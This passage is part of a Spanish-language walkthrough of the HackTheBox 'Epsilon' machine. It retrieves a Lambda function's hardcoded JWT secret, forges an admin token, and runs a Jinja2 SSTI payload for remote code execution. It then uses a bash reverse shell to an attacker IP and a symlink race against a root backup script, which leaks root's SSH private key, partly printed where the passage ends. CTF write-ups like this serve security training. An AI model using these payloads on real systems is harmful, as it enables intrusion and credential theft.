            </span><span class="nl">"FunctionArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Runtime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python3.7"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::123456789012:role/service-role/dev"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Handler"</span><span class="p">:</span><span class="w"> </span><span class="s2">"my-function.handler"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"CodeSize"</span><span class="p">:</span><span class="w"> </span><span class="mi">478</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Description"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Timeout"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
            </span><span class="nl">"LastModified"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2023-03-04T20:19:54.134+0000"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"CodeSha256"</span><span class="p">:</span><span class="w"> </span><span class="s2">"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw="</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"$LATEST"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"VpcConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
            </span><span class="nl">"TracingConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"Mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PassThrough"</span><span class="w">
            </span><span class="p">},</span><span class="w">
            </span><span class="nl">"RevisionId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"be8c779f-bcbd-44ee-abbd-905c32d7aece"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"State"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Active"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"LastUpdateStatus"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Successful"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"PackageType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Zip"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p>Vemos que existe una función lambda llamada <strong>costume_shop_v1</strong>, como ya tenemos el nombre de la función lambda que se está aplicando vamos a intentar ver qué tiene dentro, para ello vamos a buscar en el panel de ayuda:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>o get-function
</code></pre></div></div>

<p>Encontramos el comando get-function, vamos a utilizarlo:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ws --endpoint-url=http://cloud.epsilon.htb lambda get-function

usage: aws [options] &lt;command&gt; &lt;subcommand&gt; [&lt;subcommand&gt; ...] [parameters]
To see help text, you can run:

  aws help
  aws &lt;command&gt; help
  aws &lt;command&gt; &lt;subcommand&gt; help

aws: error: the following arguments are required: --function-name
</code></pre></div></div>

<p>Pero claro, tenemos que especificarle qué función queremos obtener asi que buscaremos en el panel de ayuda:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OPTIONS
       --function-name (string)
          The name of the Lambda function, version, or alias.
              Name formats
</code></pre></div></div>
<p>Vemos que existe <strong>–function-name</strong>, así que vamos a utilizar este parámetro para definir el nombre de la función:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-name=costume_shop_v1
</code></pre></div></div>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"Configuration"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"FunctionName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"costume_shop_v1"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"FunctionArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Runtime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python3.7"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::123456789012:role/service-role/dev"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Handler"</span><span class="p">:</span><span class="w"> </span><span class="s2">"my-function.handler"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"CodeSize"</span><span class="p">:</span><span class="w"> </span><span class="mi">478</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Description"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Timeout"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
        </span><span class="nl">"LastModified"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2023-03-04T20:19:54.134+0000"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"CodeSha256"</span><span class="p">:</span><span class="w"> </span><span class="s2">"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw="</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"$LATEST"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"VpcConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
        </span><span class="nl">"TracingConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PassThrough"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"RevisionId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"be8c779f-bcbd-44ee-abbd-905c32d7aece"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"State"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Active"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"LastUpdateStatus"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Successful"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"PackageType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Zip"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"Code"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Location"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Encontramos la localización de esta función, vamos a obtenerla:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
</code></pre></div></div>

<p>Luego, vemos el resultado:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file code

code: Zip archive data, at least v2.0 to extract, compression method=deflate
</code></pre></div></div>

<p>Tenemos un archivo zip, vamos a descomprimirlo:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip code
Archive:  code
  inflating: lambda_function.py
</code></pre></div></div>

<p>Veamos que contiene este script en python:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">json</span>

<span class="n">secret</span><span class="o">=</span><span class="s">'RrXCv`mrNe!K!4+5`wYq'</span> <span class="c1">#apigateway authorization for CR-124
</span>
<span class="s">'''Beta release for tracking'''</span>
<span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nb">id</span><span class="o">=</span><span class="n">event</span><span class="p">[</span><span class="s">'queryStringParameters'</span><span class="p">][</span><span class="s">'order_id'</span><span class="p">]</span>
        <span class="k">if</span> <span class="nb">id</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">{</span>
               <span class="s">'statusCode'</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
               <span class="s">'body'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">resp</span><span class="p">))</span> <span class="c1">#dynamodb tracking for CR-342
</span>            <span class="p">}</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="s">'statusCode'</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
                <span class="s">'body'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="s">'Invalid Order ID'</span><span class="p">)</span>
            <span class="p">}</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">{</span>
                <span class="s">'statusCode'</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
                <span class="s">'body'</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="s">'Invalid Order ID'</span><span class="p">)</span>
            <span class="p">}</span>
</code></pre></div></div>

<p>Aquí podemos ver la función que se está empleando, y vemos algo que necesitabamos anteriormente, tenemos el <strong>secret</strong>, con esto podemos creanos un JWT para poder logearnos en la web sin necesidad de ingresar la contraseña, por lo tanto, vamos a crear este token con python:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">jwt</span>

<span class="n">secret</span><span class="o">=</span><span class="s">'RrXCv`mrNe!K!4+5`wYq'</span>
<span class="k">print</span><span class="p">(</span><span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">"username"</span><span class="p">:</span><span class="s">"admin"</span><span class="p">},</span><span class="n">secret</span><span class="p">,</span><span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">))</span>
</code></pre></div></div>

<p>Si lo ejecutamos:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 py.py

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4
</code></pre></div></div>

<p>Vemos que hemos creado el token, vamos a intentar logearnos en la web, para ello cambiaremos nuestra cookie de sesión por el JWT:</p>

<p><img src="/imagenes/Epsilon/epsilon_2.png" alt="" /></p>

<p>Vamos a agregar un nuevo item:</p>

<p><img src="/imagenes/Epsilon/epsilon_3.png" alt="" /></p>

<p>Si nos fijamos en el <strong>server.py</strong>:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="s">"POST"</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span><span class="o">==</span><span class="s">"admin"</span> <span class="ow">and</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'password'</span><span class="p">]</span><span class="o">==</span><span class="s">"admin"</span><span class="p">:</span>
			<span class="n">res</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">()</span>
			<span class="n">username</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span>
			<span class="n">token</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">"username"</span><span class="p">:</span><span class="s">"admin"</span><span class="p">},</span><span class="n">secret</span><span class="p">,</span><span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">)</span>
			<span class="n">res</span><span class="p">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s">"auth"</span><span class="p">,</span><span class="n">token</span><span class="p">)</span>
			<span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'location'</span><span class="p">]</span><span class="o">=</span><span class="s">'/home'</span>
			<span class="k">return</span> <span class="n">res</span><span class="p">,</span><span class="mi">302</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">)</span>
</code></pre></div></div>

<p>Tenemos que el nombre de la cookie es auth, así que vamos a agregarle ese nombre y dentro de value ingresamos el JWT:</p>

<p><img src="/imagenes/Epsilon/epsilon_4.png" alt="" /></p>

<p>Con esto listo, vamos a intentar ingresar a /home, pues es donde se nos redirige:</p>

<p><img src="/imagenes/Epsilon/epsilon_5.png" alt="" /></p>

<p>Vemos que ha funcionado correctamente y estamos logeados como el usuario admin dentro de la web.</p>

<p>Vamos a inspeccionar la web para ver que encontramos:</p>

<p><img src="/imagenes/Epsilon/epsilon_6.png" alt="" /></p>

<p>Dentro de la sección de ordenes podemos este panel, vamos a hacer algunas pruebas:</p>

<p><img src="/imagenes/Epsilon/epsilon_7.png" alt="" /></p>

<p>Enviamos:</p>

<p><img src="/imagenes/Epsilon/epsilon_8.png" alt="" /></p>

<p>Vemos que se ha registrado nuestra orden de <strong>glasses</strong>, vamos a analizar esto por <code class="language-plaintext highlighter-rouge">Burpsuite</code>:</p>

<p><img src="/imagenes/Epsilon/epsilon_9.png" alt="" /></p>

<p>Vemos que existe un parámetro que se envía con el nombre del producto que queremos comprar, vamos a ver si podemos cambiarlo:</p>

<p><img src="/imagenes/Epsilon/epsilon_10.png" alt="" /></p>

<p>Vemos que nuetro imput se puede ver en la web, esto nos abre la posibilidad a lo escrito anteriormente, veremos si es vulnerable a SSTI, pues se está utilizando Flask, por lo tanto, podría ser vulnerable:</p>

<p><img src="/imagenes/Epsilon/epsilon_11.png" alt="" /></p>

<p>Efectivamente, es vulnerable a SSTI, si vamos al github de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution">PayloadsAllTheThings</a> encontramos bastante información sobre SSTI, como estamos trabajando con python utilizaremos jinja2 como en ocasiones anteriores, utilizaremos este (sin el backslash):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
</code></pre></div></div>
<p><img src="/imagenes/Epsilon/epsilon_12.png" alt="" /></p>

<p>Vemos que tenemos RCE, vamos a ganar acceso al sistema, esto lo realizaremos como siempre. En primer lugar, tendremos el siguiente archivo llamado <strong>index.html</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.17/1234 0&gt;&amp;1
</code></pre></div></div>

<p>El cual nos permitirá ganar acceso al sistema, vamos a compartir este archivo a través de un servidor http con python, y desde la máquina víctima haremos una petición a este archivo y luego lo ejecutaremos para ganar acceso mediante nuestro netcat en escucha, vamos al <code class="language-plaintext highlighter-rouge">Burpsuite</code>:</p>

<p><img src="/imagenes/Epsilon/epsilon_13.png" alt="" /></p>

<p>Si enviamos la petición y vemos nuestro servidor de python:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.134 - - [04/Mar/2023 23:22:08] "GET / HTTP/1.1" 200 -
</code></pre></div></div>

<p>Vemos una petición, si vamos a nuestro listener:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.134] 57430
bash: cannot set terminal process group (948): Inappropriate ioctl for device
bash: no job control in this shell
tom@epsilon:/var/www/app$ whoami
whoami
tom
</code></pre></div></div>

<p>Hemos ganado acceso a la máquina, vamos a buscar la flag de usuario:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:~$ cat user.txt
cat user.txt
68dbffa66652ccd6a97
</code></pre></div></div>

<p>¡Bien!, tenemos la flag, ahora debemos escalar privilegios.</p>

<h2 id="escalada-de-privilegios"><a href="#header-2"></a>Escalada de privilegios</h2>

<p>El primer paso será arreglar la terminal, para ello vamos a ejecutar los siguiente comandos:</p>

<ul>
  <li>script /dev/null -c bash</li>
  <li>control + z</li>
  <li>stty ray -echo; fg</li>
  <li>reset xterm</li>
  <li>export TERM=xterm</li>
  <li>export SHELL=bash</li>
  <li>stty rows X columns Y (dependiendo de tu stty size)</li>
</ul>

<p>De esta forma obtenemos una tty más cómoda.</p>

<p>Bien, vamos a ver los privilegios que tenemos dentro de la máquina:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/home$ sudo -l
[sudo] password for tom: 
tom@epsilon:/home$ find / -perm -4000 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
</code></pre></div></div>

<p>No tenemos la contraseña del usuario asi que no podemos ver los privilegios, no encontramos nada extraño en los permisos SUID, vamos a ignorar el pkexec que está allí.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
</code></pre></div></div>

<p>No vemos a tareas cron por aquí.</p>

<p>Vamos a utilizar una herramienta llamada <a href="https://github.com/DominicBreuker/pspy">pspy</a> que nos ayudará a encontrar procesos que se estén ejecutando por parte de root en el sistema, vamos a clonar el repositorio y compilarlo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/local/go/bin/go build -ldflags "-s -w" .

go: downloading github.com/spf13/cobra v1.4.0
go: downloading golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a
</code></pre></div></div>
<p>Luego, abrimos un servidor http con python y desde la máquina víctima descargarmos el archivo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp$ wget http://10.10.14.17/pspy
--2023-03-05 04:48:17--  http://10.10.14.17/pspy
Connecting to 10.10.14.17:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3252224 (3.1M) [application/octet-stream]
Saving to: ‘pspy’

pspy                100%[===================&gt;]   3.10M  1.33MB/s    in 2.3s    

2023-03-05 04:48:19 (1.33 MB/s) - ‘pspy’ saved [3252224/3252224]

tom@epsilon:/tmp$ ls
pspy
</code></pre></div></div>
<p>Le damos permisos se ejecución y lo ejecutamos:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp$ chmod +x pspy
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp$ ./pspy
./pspy: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./pspy)
./pspy: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pspy)
</code></pre></div></div>

<p>Sin embargo, no nos ha funcionado, vamos a solucionarlo buscando los binarios en el github de la herramienta:</p>

<p><img src="/imagenes/Epsilon/epsilon_14.png" alt="" /></p>

<p>Vamos a descargar el pspy64 y lo vamos a compartir de la misma forma con el servidor http:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp$ wget http://10.10.14.17/pspy64
--2023-03-05 04:58:39--  http://10.10.14.17/pspy64
Connecting to 10.10.14.17:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================&gt;]   2.96M  1.28MB/s    in 2.3s    

2023-03-05 04:58:42 (1.28 MB/s) - ‘pspy64’ saved [3104768/3104768]

tom@epsilon:/tmp$ chmod +x pspy64
tom@epsilon:/tmp$ ./pspy64
</code></pre></div></div>

<p>Y ahora:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>spy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
</code></pre></div></div>

<p>Mientras se ejecuta vemos algo interesante:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2023/03/05 04:59:01 CMD: UID=0     PID=10156  | /bin/bash /usr/bin/backup.sh 
2023/03/05 04:59:01 CMD: UID=0     PID=10157  | /usr/bin/tar -cvf /opt/backups/606036422.tar /var/www/app/ 
2023/03/05 04:59:01 CMD: UID=0     PID=10159  | /bin/bash /usr/bin/backup.sh 
2023/03/05 04:59:01 CMD: UID=0     PID=10158  | /bin/bash /usr/bin/backup.sh 
2023/03/05 04:59:01 CMD: UID=0     PID=10160  | /bin/bash /usr/bin/backup.sh 
</code></pre></div></div>

<p>Vemos que root está ejecutando el archivo backup.sh, vamos a ver que es:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nv">file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
/usr/bin/tar <span class="nt">-cvf</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> /var/www/app/
<span class="nb">sha1sum</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f1</span> <span class="o">&gt;</span> /opt/backups/checksum
<span class="nb">sleep </span>5
<span class="nv">check_file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
/usr/bin/tar <span class="nt">-chvf</span> <span class="s2">"/var/backups/web_backups/</span><span class="k">${</span><span class="nv">check_file</span><span class="k">}</span><span class="s2">.tar"</span> /opt/backups/checksum <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span>
/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
</code></pre></div></div>
<p>Vemos que en primer lugar borra todo lo existente en <strong>/opt/backups</strong>, luego de esto crea un archivo .tar que tendrá dentro todo lo que está en <strong>/var/www/app</strong>, luego envía el hash de este archivo tar a la ruta <strong>/opt/backups/checksum</strong>. Podemos ver que finalmente utiliza tar para comprimir el archivo con el <strong>checksum</strong> creado junto con el mismo archivo tar inicial, lo importante aquí es una flag que está utilizando la cual es -h, esta permite hacer un seguimiento del los enlaces simbólicos, lo que nos va a permitir hacer lo siguiente.</p>

<p>Como podemos eliminar y crear el archivo <strong>checksum</strong>, lo que haremos será que mientras que el código esté en el sleep 5, borraremos el archivo <strong>checksum</strong> y lo reemplazaremos por otro, el cual tendrá un symlink hacia la <strong>id_rsa</strong> de root, dentro del directorio <strong>/root/.ssh</strong>, de esta forma vamos a tener un nuevo archivo tar final modificado, el cual al descomprimirlo, entregará los datos comprimidos de <strong>/var/www/app/</strong> y el <strong>checksum</strong>, sin embargo, el checksum ya no será el sha1 del código original, sino que será la <strong>id_rsa</strong> de root pues la flag -h realiza el seguimiento al symlink.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
        if</span> <span class="o">[</span> <span class="nt">-e</span> /opt/backups/checksum <span class="o">]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">rm</span> /opt/backups/checksum
                <span class="nb">ln</span> <span class="nt">-s</span> <span class="nt">-f</span> /root/.ssh/id_rsa /opt/backups/checksum
                <span class="nb">echo</span> <span class="s2">"finalizado"</span>
                <span class="nb">break 
        </span><span class="k">fi
done</span>
</code></pre></div></div>

<p>Para ello este script en bash borrará cualquier checksum que llegue y lo reemplazará por otro archivo llamado checksum que tendrá un symlink hacia la <strong>id_rsa</strong> de root. Vamos a ejecutarlo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp$ ./test.sh
rm: remove write-protected regular file '/opt/backups/checksum'? y
finalizado
tom@epsilon:/tmp$ cd /var/backups/web_backups
tom@epsilon:/var/backups/web_backups$ ls
224789875.tar  259999126.tar
tom@epsilon:/var/backups/web_backups$ cp 259999126.tar /tmp
tom@epsilon:/var/backups/web_backups$ cd /tmp
</code></pre></div></div>

<p>Copiamos el último tar creado y lo llevamos a tmp para descomprimirlo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp$ tar -xf 259999126.tar
</code></pre></div></div>

<p>Si vemos el archivo:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp$ cd opt
tom@epsilon:/tmp/opt$ ls
backups
tom@epsilon:/tmp/opt$ cd backups/
tom@epsilon:/tmp/opt/backups$ ls
245036605.tar  checksum
tom@epsilon:/tmp/opt/backups$ cat checksum 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1w26V2ovmMpeSCDauNqlsPHLtTP8dI8HuQ4yGY3joZ9zT1NoeIdF
16L/79L3nSFwAXdmUtrCIZuBNjXmRBMzp6euQjUPB/65yK9w8pieXewbWZ6lX1l6wHNygr
QFacJOu4ju+vXI/BVB43mvqXXfgUQqmkY62gmImf4xhP4RWwHCOSU8nDJv2s2+isMeYIXE
SB8l1wWP9EiPo0NWlJ8WPe2nziSB68vZjQS5yxLRtQvkSvpHBqW90frHWlpG1eXVK8S9B0
1PuEoxQjS0fNASZ2zhG8TJ1XAamxT3YuOhX2K6ssH36WVYSLOF/2KDlZsbJyxwG0V8QkgF
u0DPZ0V8ckuh0o+Lm64PFXlSyOFcb/1SU/wwid4i9aYzhNOQOxDSPh2vmXxPDkB0/dLAO6
wBlOakYszruVLMkngP89QOKLIGasmzIU816KKufUdLSFczig96aVRxeFcVAHgi1ry1O7Tr
oCIJewhvsh8I/kemAhNHjwt3imGulUmlIw/s1cpdAAAFiAR4Z9EEeGfRAAAAB3NzaC1yc2
EAAAGBANcNuldqL5jKXkgg2rjapbDxy7Uz/HSPB7kOMhmN46Gfc09TaHiHRdei/+/S950h
